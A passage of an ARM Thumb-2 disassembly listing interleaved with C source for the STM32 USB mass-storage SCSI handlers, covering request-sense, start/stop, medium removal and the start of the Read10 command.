 800a3a2:	d102      	bne.n	800a3aa <SCSI_RequestSense+0x2a>
  {
    return -1;
 800a3a4:	f04f 33ff 	mov.w	r3, #4294967295
 800a3a8:	e080      	b.n	800a4ac <SCSI_RequestSense+0x12c>
  }

  if (hmsc->cbw.dDataLength == 0U)
 800a3aa:	693b      	ldr	r3, [r7, #16]
 800a3ac:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a3b0:	699b      	ldr	r3, [r3, #24]
 800a3b2:	2b00      	cmp	r3, #0
 800a3b4:	d10b      	bne.n	800a3ce <SCSI_RequestSense+0x4e>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a3b6:	693b      	ldr	r3, [r7, #16]
 800a3b8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a3bc:	7f59      	ldrb	r1, [r3, #29]
 800a3be:	2320      	movs	r3, #32
 800a3c0:	2205      	movs	r2, #5
 800a3c2:	68f8      	ldr	r0, [r7, #12]
 800a3c4:	f000 f876 	bl	800a4b4 <SCSI_SenseCode>
    return -1;
 800a3c8:	f04f 33ff 	mov.w	r3, #4294967295
 800a3cc:	e06e      	b.n	800a4ac <SCSI_RequestSense+0x12c>
  }

  for (i = 0U; i < REQUEST_SENSE_DATA_LEN; i++)
 800a3ce:	2300      	movs	r3, #0
 800a3d0:	75fb      	strb	r3, [r7, #23]
 800a3d2:	e007      	b.n	800a3e4 <SCSI_RequestSense+0x64>
  {
    hmsc->bot_data[i] = 0U;
 800a3d4:	7dfb      	ldrb	r3, [r7, #23]
 800a3d6:	693a      	ldr	r2, [r7, #16]
 800a3d8:	4413      	add	r3, r2
 800a3da:	2200      	movs	r2, #0
 800a3dc:	741a      	strb	r2, [r3, #16]
  for (i = 0U; i < REQUEST_SENSE_DATA_LEN; i++)
 800a3de:	7dfb      	ldrb	r3, [r7, #23]
 800a3e0:	3301      	adds	r3, #1
 800a3e2:	75fb      	strb	r3, [r7, #23]
 800a3e4:	7dfb      	ldrb	r3, [r7, #23]
 800a3e6:	2b11      	cmp	r3, #17
 800a3e8:	d9f4      	bls.n	800a3d4 <SCSI_RequestSense+0x54>
  }

  hmsc->bot_data[0] = 0x70U;
 800a3ea:	693b      	ldr	r3, [r7, #16]
 800a3ec:	2270      	movs	r2, #112	; 0x70
 800a3ee:	741a      	strb	r2, [r3, #16]
  hmsc->bot_data[7] = REQUEST_SENSE_DATA_LEN - 6U;
 800a3f0:	693b      	ldr	r3, [r7, #16]
 800a3f2:	220c      	movs	r2, #12
 800a3f4:	75da      	strb	r2, [r3, #23]

  if ((hmsc->scsi_sense_head != hmsc->scsi_sense_tail))
 800a3f6:	693b      	ldr	r3, [r7, #16]
 800a3f8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a3fc:	f893 2060 	ldrb.w	r2, [r3, #96]	; 0x60
 800a400:	693b      	ldr	r3, [r7, #16]
 800a402:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a406:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a40a:	429a      	cmp	r2, r3
 800a40c:	d03f      	beq.n	800a48e <SCSI_RequestSense+0x10e>
  {
    hmsc->bot_data[2] = (uint8_t)hmsc->scsi_sense[hmsc->scsi_sense_head].Skey;
 800a40e:	693b      	ldr	r3, [r7, #16]
 800a410:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a414:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a418:	461a      	mov	r2, r3
 800a41a:	693b      	ldr	r3, [r7, #16]
 800a41c:	f502 7202 	add.w	r2, r2, #520	; 0x208
 800a420:	f813 2032 	ldrb.w	r2, [r3, r2, lsl #3]
 800a424:	693b      	ldr	r3, [r7, #16]
 800a426:	749a      	strb	r2, [r3, #18]
    hmsc->bot_data[12] = (uint8_t)hmsc->scsi_sense[hmsc->scsi_sense_head].w.b.ASC;
 800a428:	693b      	ldr	r3, [r7, #16]
 800a42a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a42e:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a432:	693a      	ldr	r2, [r7, #16]
 800a434:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a438:	00db      	lsls	r3, r3, #3
 800a43a:	4413      	add	r3, r2
 800a43c:	791a      	ldrb	r2, [r3, #4]
 800a43e:	693b      	ldr	r3, [r7, #16]
 800a440:	771a      	strb	r2, [r3, #28]
    hmsc->bot_data[13] = (uint8_t)hmsc->scsi_sense[hmsc->scsi_sense_head].w.b.ASCQ;
 800a442:	693b      	ldr	r3, [r7, #16]
 800a444:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a448:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a44c:	693a      	ldr	r2, [r7, #16]
 800a44e:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a452:	00db      	lsls	r3, r3, #3
 800a454:	4413      	add	r3, r2
 800a456:	795a      	ldrb	r2, [r3, #5]
 800a458:	693b      	ldr	r3, [r7, #16]
 800a45a:	775a      	strb	r2, [r3, #29]
    hmsc->scsi_sense_head++;
 800a45c:	693b      	ldr	r3, [r7, #16]
 800a45e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a462:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a466:	3301      	adds	r3, #1
 800a468:	b2da      	uxtb	r2, r3
 800a46a:	693b      	ldr	r3, [r7, #16]
 800a46c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a470:	f883 2060 	strb.w	r2, [r3, #96]	; 0x60

    if (hmsc->scsi_sense_head == SENSE_LIST_DEEPTH)
 800a474:	693b      	ldr	r3, [r7, #16]
 800a476:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a47a:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a47e:	2b04      	cmp	r3, #4
 800a480:	d105      	bne.n	800a48e <SCSI_RequestSense+0x10e>
    {
      hmsc->scsi_sense_head = 0U;
 800a482:	693b      	ldr	r3, [r7, #16]
 800a484:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a488:	2200      	movs	r2, #0
 800a48a:	f883 2060 	strb.w	r2, [r3, #96]	; 0x60
    }
  }

  hmsc->bot_data_length = REQUEST_SENSE_DATA_LEN;
 800a48e:	693b      	ldr	r3, [r7, #16]
 800a490:	2212      	movs	r2, #18
 800a492:	60da      	str	r2, [r3, #12]

  if (params[4] <= REQUEST_SENSE_DATA_LEN)
 800a494:	687b      	ldr	r3, [r7, #4]
 800a496:	3304      	adds	r3, #4
 800a498:	781b      	ldrb	r3, [r3, #0]
 800a49a:	2b12      	cmp	r3, #18
 800a49c:	d805      	bhi.n	800a4aa <SCSI_RequestSense+0x12a>
  {
    hmsc->bot_data_length = params[4];
 800a49e:	687b      	ldr	r3, [r7, #4]
 800a4a0:	3304      	adds	r3, #4
 800a4a2:	781b      	ldrb	r3, [r3, #0]
 800a4a4:	461a      	mov	r2, r3
 800a4a6:	693b      	ldr	r3, [r7, #16]
 800a4a8:	60da      	str	r2, [r3, #12]
  }

  return 0;
 800a4aa:	2300      	movs	r3, #0
}
 800a4ac:	4618      	mov	r0, r3
 800a4ae:	3718      	adds	r7, #24
 800a4b0:	46bd      	mov	sp, r7
 800a4b2:	bd80      	pop	{r7, pc}

0800a4b4 <SCSI_SenseCode>:
  * @param  ASC: Additional Sense Code
  * @retval none

  */
void SCSI_SenseCode(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t sKey, uint8_t ASC)
{
 800a4b4:	b480      	push	{r7}
 800a4b6:	b085      	sub	sp, #20
 800a4b8:	af00      	add	r7, sp, #0
 800a4ba:	6078      	str	r0, [r7, #4]
 800a4bc:	4608      	mov	r0, r1
 800a4be:	4611      	mov	r1, r2
 800a4c0:	461a      	mov	r2, r3
 800a4c2:	4603      	mov	r3, r0
 800a4c4:	70fb      	strb	r3, [r7, #3]
 800a4c6:	460b      	mov	r3, r1
 800a4c8:	70bb      	strb	r3, [r7, #2]
 800a4ca:	4613      	mov	r3, r2
 800a4cc:	707b      	strb	r3, [r7, #1]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a4ce:	687b      	ldr	r3, [r7, #4]
 800a4d0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a4d4:	687b      	ldr	r3, [r7, #4]
 800a4d6:	32b0      	adds	r2, #176	; 0xb0
 800a4d8:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a4dc:	60fb      	str	r3, [r7, #12]

  if (hmsc == NULL)
 800a4de:	68fb      	ldr	r3, [r7, #12]
 800a4e0:	2b00      	cmp	r3, #0
 800a4e2:	d03d      	beq.n	800a560 <SCSI_SenseCode+0xac>
  {
    return;
  }

  hmsc->scsi_sense[hmsc->scsi_sense_tail].Skey = sKey;
 800a4e4:	68fb      	ldr	r3, [r7, #12]
 800a4e6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a4ea:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a4ee:	461a      	mov	r2, r3
 800a4f0:	68fb      	ldr	r3, [r7, #12]
 800a4f2:	f502 7202 	add.w	r2, r2, #520	; 0x208
 800a4f6:	78b9      	ldrb	r1, [r7, #2]
 800a4f8:	f803 1032 	strb.w	r1, [r3, r2, lsl #3]
  hmsc->scsi_sense[hmsc->scsi_sense_tail].w.b.ASC = ASC;
 800a4fc:	68fb      	ldr	r3, [r7, #12]
 800a4fe:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a502:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a506:	68fa      	ldr	r2, [r7, #12]
 800a508:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a50c:	00db      	lsls	r3, r3, #3
 800a50e:	4413      	add	r3, r2
 800a510:	787a      	ldrb	r2, [r7, #1]
 800a512:	711a      	strb	r2, [r3, #4]
  hmsc->scsi_sense[hmsc->scsi_sense_tail].w.b.ASCQ = 0U;
 800a514:	68fb      	ldr	r3, [r7, #12]
 800a516:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a51a:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a51e:	68fa      	ldr	r2, [r7, #12]
 800a520:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a524:	00db      	lsls	r3, r3, #3
 800a526:	4413      	add	r3, r2
 800a528:	2200      	movs	r2, #0
 800a52a:	715a      	strb	r2, [r3, #5]
  hmsc->scsi_sense_tail++;
 800a52c:	68fb      	ldr	r3, [r7, #12]
 800a52e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a532:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a536:	3301      	adds	r3, #1
 800a538:	b2da      	uxtb	r2, r3
 800a53a:	68fb      	ldr	r3, [r7, #12]
 800a53c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a540:	f883 2061 	strb.w	r2, [r3, #97]	; 0x61

  if (hmsc->scsi_sense_tail == SENSE_LIST_DEEPTH)
 800a544:	68fb      	ldr	r3, [r7, #12]
 800a546:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a54a:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a54e:	2b04      	cmp	r3, #4
 800a550:	d107      	bne.n	800a562 <SCSI_SenseCode+0xae>
  {
    hmsc->scsi_sense_tail = 0U;
 800a552:	68fb      	ldr	r3, [r7, #12]
 800a554:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a558:	2200      	movs	r2, #0
 800a55a:	f883 2061 	strb.w	r2, [r3, #97]	; 0x61
 800a55e:	e000      	b.n	800a562 <SCSI_SenseCode+0xae>
    return;
 800a560:	bf00      	nop
  }
}
 800a562:	3714      	adds	r7, #20
 800a564:	46bd      	mov	sp, r7
 800a566:	f85d 7b04 	ldr.w	r7, [sp], #4
 800a56a:	4770      	bx	lr

0800a56c <SCSI_StartStopUnit>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_StartStopUnit(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a56c:	b580      	push	{r7, lr}
 800a56e:	b086      	sub	sp, #24
 800a570:	af00      	add	r7, sp, #0
 800a572:	60f8      	str	r0, [r7, #12]
 800a574:	460b      	mov	r3, r1
 800a576:	607a      	str	r2, [r7, #4]
 800a578:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a57a:	68fb      	ldr	r3, [r7, #12]
 800a57c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a580:	68fb      	ldr	r3, [r7, #12]
 800a582:	32b0      	adds	r2, #176	; 0xb0
 800a584:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a588:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a58a:	697b      	ldr	r3, [r7, #20]
 800a58c:	2b00      	cmp	r3, #0
 800a58e:	d102      	bne.n	800a596 <SCSI_StartStopUnit+0x2a>
  {
    return -1;
 800a590:	f04f 33ff 	mov.w	r3, #4294967295
 800a594:	e043      	b.n	800a61e <SCSI_StartStopUnit+0xb2>
  }

  if ((hmsc->scsi_medium_state == SCSI_MEDIUM_LOCKED) && ((params[4] & 0x3U) == 2U))
 800a596:	697b      	ldr	r3, [r7, #20]
 800a598:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a59c:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a5a0:	2b01      	cmp	r3, #1
 800a5a2:	d10f      	bne.n	800a5c4 <SCSI_StartStopUnit+0x58>
 800a5a4:	687b      	ldr	r3, [r7, #4]
 800a5a6:	3304      	adds	r3, #4
 800a5a8:	781b      	ldrb	r3, [r3, #0]
 800a5aa:	f003 0303 	and.w	r3, r3, #3
 800a5ae:	2b02      	cmp	r3, #2
 800a5b0:	d108      	bne.n	800a5c4 <SCSI_StartStopUnit+0x58>
  {
    SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, INVALID_FIELED_IN_COMMAND);
 800a5b2:	7af9      	ldrb	r1, [r7, #11]
 800a5b4:	2324      	movs	r3, #36	; 0x24
 800a5b6:	2205      	movs	r2, #5
 800a5b8:	68f8      	ldr	r0, [r7, #12]
 800a5ba:	f7ff ff7b 	bl	800a4b4 <SCSI_SenseCode>

    return -1;
 800a5be:	f04f 33ff 	mov.w	r3, #4294967295
 800a5c2:	e02c      	b.n	800a61e <SCSI_StartStopUnit+0xb2>
  }

  if ((params[4] & 0x3U) == 0x1U) /* START=1 */
 800a5c4:	687b      	ldr	r3, [r7, #4]
 800a5c6:	3304      	adds	r3, #4
 800a5c8:	781b      	ldrb	r3, [r3, #0]
 800a5ca:	f003 0303 	and.w	r3, r3, #3
 800a5ce:	2b01      	cmp	r3, #1
 800a5d0:	d106      	bne.n	800a5e0 <SCSI_StartStopUnit+0x74>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800a5d2:	697b      	ldr	r3, [r7, #20]
 800a5d4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a5d8:	2200      	movs	r2, #0
 800a5da:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
 800a5de:	e01a      	b.n	800a616 <SCSI_StartStopUnit+0xaa>
  }
  else if ((params[4] & 0x3U) == 0x2U) /* START=0 and LOEJ Load Eject=1 */
 800a5e0:	687b      	ldr	r3, [r7, #4]
 800a5e2:	3304      	adds	r3, #4
 800a5e4:	781b      	ldrb	r3, [r3, #0]
 800a5e6:	f003 0303 	and.w	r3, r3, #3
 800a5ea:	2b02      	cmp	r3, #2
 800a5ec:	d106      	bne.n	800a5fc <SCSI_StartStopUnit+0x90>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_EJECTED;
 800a5ee:	697b      	ldr	r3, [r7, #20]
 800a5f0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a5f4:	2202      	movs	r2, #2
 800a5f6:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
 800a5fa:	e00c      	b.n	800a616 <SCSI_StartStopUnit+0xaa>
  }
  else if ((params[4] & 0x3U) == 0x3U) /* START=1 and LOEJ Load Eject=1 */
 800a5fc:	687b      	ldr	r3, [r7, #4]
 800a5fe:	3304      	adds	r3, #4
 800a600:	781b      	ldrb	r3, [r3, #0]
 800a602:	f003 0303 	and.w	r3, r3, #3
 800a606:	2b03      	cmp	r3, #3
 800a608:	d105      	bne.n	800a616 <SCSI_StartStopUnit+0xaa>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800a60a:	697b      	ldr	r3, [r7, #20]
 800a60c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a610:	2200      	movs	r2, #0
 800a612:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
  }
  else
  {
    /* .. */
  }
  hmsc->bot_data_length = 0U;
 800a616:	697b      	ldr	r3, [r7, #20]
 800a618:	2200      	movs	r2, #0
 800a61a:	60da      	str	r2, [r3, #12]

  return 0;
 800a61c:	2300      	movs	r3, #0
}
 800a61e:	4618      	mov	r0, r3
 800a620:	3718      	adds	r7, #24
 800a622:	46bd      	mov	sp, r7
 800a624:	bd80      	pop	{r7, pc}

0800a626 <SCSI_AllowPreventRemovable>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_AllowPreventRemovable(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a626:	b480      	push	{r7}
 800a628:	b087      	sub	sp, #28
 800a62a:	af00      	add	r7, sp, #0
 800a62c:	60f8      	str	r0, [r7, #12]
 800a62e:	460b      	mov	r3, r1
 800a630:	607a      	str	r2, [r7, #4]
 800a632:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a634:	68fb      	ldr	r3, [r7, #12]
 800a636:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a63a:	68fb      	ldr	r3, [r7, #12]
 800a63c:	32b0      	adds	r2, #176	; 0xb0
 800a63e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a642:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a644:	697b      	ldr	r3, [r7, #20]
 800a646:	2b00      	cmp	r3, #0
 800a648:	d102      	bne.n	800a650 <SCSI_AllowPreventRemovable+0x2a>
  {
    return -1;
 800a64a:	f04f 33ff 	mov.w	r3, #4294967295
 800a64e:	e015      	b.n	800a67c <SCSI_AllowPreventRemovable+0x56>
  }

  if (params[4] == 0U)
 800a650:	687b      	ldr	r3, [r7, #4]
 800a652:	3304      	adds	r3, #4
 800a654:	781b      	ldrb	r3, [r3, #0]
 800a656:	2b00      	cmp	r3, #0
 800a658:	d106      	bne.n	800a668 <SCSI_AllowPreventRemovable+0x42>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800a65a:	697b      	ldr	r3, [r7, #20]
 800a65c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a660:	2200      	movs	r2, #0
 800a662:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
 800a666:	e005      	b.n	800a674 <SCSI_AllowPreventRemovable+0x4e>
  }
  else
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_LOCKED;
 800a668:	697b      	ldr	r3, [r7, #20]
 800a66a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a66e:	2201      	movs	r2, #1
 800a670:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
  }

  hmsc->bot_data_length = 0U;
 800a674:	697b      	ldr	r3, [r7, #20]
 800a676:	2200      	movs	r2, #0
 800a678:	60da      	str	r2, [r3, #12]

  return 0;
 800a67a:	2300      	movs	r3, #0
}
 800a67c:	4618      	mov	r0, r3
 800a67e:	371c      	adds	r7, #28
 800a680:	46bd      	mov	sp, r7
 800a682:	f85d 7b04 	ldr.w	r7, [sp], #4
 800a686:	4770      	bx	lr

0800a688 <SCSI_Read10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Read10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a688:	b580      	push	{r7, lr}
 800a68a:	b086      	sub	sp, #24
 800a68c:	af00      	add	r7, sp, #0
 800a68e:	60f8      	str	r0, [r7, #12]
 800a690:	460b      	mov	r3, r1
 800a692:	607a      	str	r2, [r7, #4]
 800a694:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a696:	68fb      	ldr	r3, [r7, #12]
 800a698:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a69c:	68fb      	ldr	r3, [r7, #12]
 800a69e:	32b0      	adds	r2, #176	; 0xb0
 800a6a0:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a6a4:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a6a6:	697b      	ldr	r3, [r7, #20]
 800a6a8:	2b00      	cmp	r3, #0
 800a6aa:	d102      	bne.n	800a6b2 <SCSI_Read10+0x2a>
  {
    return -1;
 800a6ac:	f04f 33ff 	mov.w	r3, #4294967295
 800a6b0:	e09d      	b.n	800a7ee <SCSI_Read10+0x166>
  }

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a6b2:	697b      	ldr	r3, [r7, #20]
 800a6b4:	7a1b      	ldrb	r3, [r3, #8]
 800a6b6:	2b00      	cmp	r3, #0
 800a6b8:	f040 808f 	bne.w	800a7da <SCSI_Read10+0x152>
  {
    /* case 10 : Ho <> Di */
    if ((hmsc->cbw.bmFlags & 0x80U) != 0x80U)
 800a6bc:	697b      	ldr	r3, [r7, #20]
 800a6be:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a6c2:	7f1b      	ldrb	r3, [r3, #28]
 800a6c4:	b25b      	sxtb	r3, r3
 800a6c6:	2b00      	cmp	r3, #0
 800a6c8:	db0b      	blt.n	800a6e2 <SCSI_Read10+0x5a>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a6ca:	697b      	ldr	r3, [r7, #20]
 800a6cc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a6d0:	7f59      	ldrb	r1, [r3, #29]
 800a6d2:	2320      	movs	r3, #32
 800a6d4:	2205      	movs	r2, #5
 800a6d6:	68f8      	ldr	r0, [r7, #12]
 800a6d8:	f7ff feec 	bl	800a4b4 <SCSI_SenseCode>
      return -1;
 800a6dc:	f04f 33ff 	mov.w	r3, #4294967295
 800a6e0:	e085      	b.n	800a7ee <SCSI_Read10+0x166>
    }

    if (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED)
 800a6e2:	697b      	ldr	r3, [r7, #20]
 800a6e4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a6e8:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a6ec:	2b02      	cmp	r3, #2
 800a6ee:	d108      	bne.n	800a702 <SCSI_Read10+0x7a>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a6f0:	7af9      	ldrb	r1, [r7, #11]
 800a6f2:	233a      	movs	r3, #58	; 0x3a
 800a6f4:	2202      	movs	r2, #2
 800a6f6:	68f8      	ldr	r0, [r7, #12]
 800a6f8:	f7ff fedc 	bl	800a4b4 <SCSI_SenseCode>

      return -1;
 800a6fc:	f04f 33ff 	mov.w	r3, #4294967295
 800a700:	e075      	b.n	800a7ee <SCSI_Read10+0x166>
    }

    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a702:	68fb      	ldr	r3, [r7, #12]
 800a704:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a708:	68fa      	ldr	r2, [r7, #12]
 800a70a:	33b0      	adds	r3, #176	; 0xb0
 800a70c:	009b      	lsls	r3, r3, #2
 800a70e:	4413      	add	r3, r2
 800a710:	685b      	ldr	r3, [r3, #4]
 800a712:	689b      	ldr	r3, [r3, #8]
 800a714:	7afa      	ldrb	r2, [r7, #11]
 800a716:	4610      	mov	r0, r2
 800a718:	4798      	blx	r3
 800a71a:	4603      	mov	r3, r0
 800a71c:	2b00      	cmp	r3, #0
 800a71e:	d008      	beq.n	800a732 <SCSI_Read10+0xaa>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a720:	7af9      	ldrb	r1, [r7, #11]
 800a722:	233a      	movs	r3, #58	; 0x3a
 800a724:	2202      	movs	r2, #2
 800a726:	68f8      	ldr	r0, [r7, #12]
 800a728:	f7ff fec4 	bl	800a4b4 <SCSI_SenseCode>
      return -1;
 800a72c:	f04f 33ff 	mov.w	r3, #4294967295
 800a730:	e05d      	b.n	800a7ee <SCSI_Read10+0x166>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a732:	687b      	ldr	r3, [r7, #4]
 800a734:	3302      	adds	r3, #2
 800a736:	781b      	ldrb	r3, [r3, #0]
 800a738:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a73a:	687b      	ldr	r3, [r7, #4]
 800a73c:	3303      	adds	r3, #3
 800a73e:	781b      	ldrb	r3, [r3, #0]
 800a740:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a742:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] <<  8) |
 800a744:	687b      	ldr	r3, [r7, #4]
 800a746:	3304      	adds	r3, #4
 800a748:	781b      	ldrb	r3, [r3, #0]
 800a74a:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800a74c:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800a74e:	687a      	ldr	r2, [r7, #4]
 800a750:	3205      	adds	r2, #5
 800a752:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] <<  8) |
 800a754:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a756:	697a      	ldr	r2, [r7, #20]
 800a758:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a75c:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[7] <<  8) | (uint32_t)params[8];
 800a75e:	687b      	ldr	r3, [r7, #4]
 800a760:	3307      	adds	r3, #7
 800a762:	781b      	ldrb	r3, [r3, #0]
 800a764:	021b      	lsls	r3, r3, #8
 800a766:	687a      	ldr	r2, [r7, #4]
 800a768:	3208      	adds	r2, #8
 800a76a:	7812      	ldrb	r2, [r2, #0]
 800a76c:	4313      	orrs	r3, r2
 800a76e:	697a      	ldr	r2, [r7, #20]
 800a770:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a774:	6713      	str	r3, [r2, #112]	; 0x70

    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800a776:	697b      	ldr	r3, [r7, #20]
 800a778:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a77c:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800a77e:	697b      	ldr	r3, [r7, #20]
 800a780:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a784:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a786:	7af9      	ldrb	r1, [r7, #11]
 800a788:	68f8      	ldr	r0, [r7, #12]
 800a78a:	f000 fb0c 	bl	800ada6 <SCSI_CheckAddressRange>
 800a78e:	4603      	mov	r3, r0
 800a790:	2b00      	cmp	r3, #0
 800a792:	da02      	bge.n	800a79a <SCSI_Read10+0x112>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800a794:	f04f 33ff 	mov.w	r3, #4294967295
 800a798:	e029      	b.n	800a7ee <SCSI_Read10+0x166>
    }

    /* cases 4,5 : Hi <> Dn */
    if (hmsc->cbw.dDataLength != (hmsc->scsi_blk_len * hmsc->scsi_blk_size))
 800a79a:	697b      	ldr	r3, [r7, #20]
 800a79c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a7a0:	699a      	ldr	r2, [r3, #24]
 800a7a2:	697b      	ldr	r3, [r7, #20]
 800a7a4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a7a8:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a7aa:	6979      	ldr	r1, [r7, #20]
 800a7ac:	f501 5180 	add.w	r1, r1, #4096	; 0x1000
 800a7b0:	f8b1 1064 	ldrh.w	r1, [r1, #100]	; 0x64
 800a7b4:	fb01 f303 	mul.w	r3, r1, r3
 800a7b8:	429a      	cmp	r2, r3
 800a7ba:	d00b      	beq.n	800a7d4 <SCSI_Read10+0x14c>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a7bc:	697b      	ldr	r3, [r7, #20]
 800a7be:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a7c2:	7f59      	ldrb	r1, [r3, #29]
 800a7c4:	2320      	movs	r3, #32
